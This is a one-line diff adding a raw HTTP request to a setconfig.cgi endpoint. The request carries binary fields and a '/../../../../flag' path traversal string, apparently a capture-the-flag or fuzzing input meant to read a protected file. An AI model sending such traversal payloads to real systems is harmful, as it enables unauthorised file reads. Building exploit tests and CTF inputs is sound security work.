@@ -1,0 +1,1 @@
+GET /setconfig.cgi? HTTP/1.0\r\n\r\n\x18\x00\x00\x00\x13\x00\x00\x00/../../../../flag\x00\n
